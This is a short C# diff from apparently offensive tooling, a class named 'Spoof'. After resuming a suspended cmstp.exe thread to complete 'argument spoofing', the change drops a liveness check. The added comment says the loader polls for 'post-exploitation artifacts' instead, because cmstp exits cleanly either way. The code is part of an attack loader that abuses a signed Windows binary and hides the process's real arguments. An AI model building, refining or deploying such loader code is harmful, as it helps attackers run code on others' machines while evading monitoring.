@@ -193,17 +193,10 @@ public static class Spoof
 
         Log("[*] Resuming cmstp.exe thread...");
         ResumeThread(pi.hThread);
-        Log("[*] Watching cmstp.exe for 3s...");
-        Thread.Sleep(3000);
-        Process[] procs = Process.GetProcessesByName("cmstp");
-        if (procs.Length > 0) {
-            Log("[+] cmstp.exe alive after 3s (PID=" + procs[0].Id + ") - INF accepted");
-        } else {
-            Log("[-] cmstp.exe exited within 3s - INF processing likely failed");
-            Log("[-] Check Windows Event Log -> Application for cmstp.exe errors");
-        }
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+        // ponytail: cmstp /au /s exits cleanly regardless of INF result, so an
+        // alive-check is a false-negative. Loader polls for post-ex artifacts instead.
         Log("[+] cmstp.exe resumed, argument spoofing complete");
     }
 }
